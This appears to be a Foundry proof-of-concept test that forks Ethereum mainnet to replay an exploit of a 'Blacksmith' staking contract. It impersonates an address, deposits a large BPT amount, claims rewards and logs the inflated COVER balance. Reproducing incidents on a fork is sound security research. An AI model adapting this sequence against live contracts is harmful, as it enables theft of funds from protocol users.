// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

interface Blacksmith {
    function claimRewardsForPools(address[] calldata _lpTokens) external;

    function claimRewards(address _lpToken) external;

    function deposit(address _lpToken, uint256 _amount) external;

    function withdraw(address _lpToken, uint256 _amount) external;
}

contract ContractTest is Test {
    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    Blacksmith public bs = Blacksmith(0xE0B94a7BB45dD905c79bB1992C9879f40F1CAeD5);

    IERC20 public bpt = IERC20(0x59686E01Aa841f622a43688153062C2f24F8fDed);

    IERC20 public Cover = IERC20(0x5D8d9F5b96f4438195BE9b99eee6118Ed4304286);

    function setUp() public {
        cheat.createSelectFork("mainnet", 11_542_309); // fork mainnet at block 11542309
    }

    function test() public {
        cheat.prank(0x00007569643bc1709561ec2E86F385Df3759e5DD);
        bs.deposit(address(bpt), 15_255_552_810_089_260_015_361);
        emit log_named_uint("Deposit BPT", 15_255_552_810_089_260_015_361);
        cheat.prank(0x00007569643bc1709561ec2E86F385Df3759e5DD);
        //bs.withdraw(address(bpt),12345678);
        bs.claimRewards(address(bpt));
        emit log_named_uint(
            "After claimRewards, Cover Balance", Cover.balanceOf(0x00007569643bc1709561ec2E86F385Df3759e5DD)
        );
    }
}
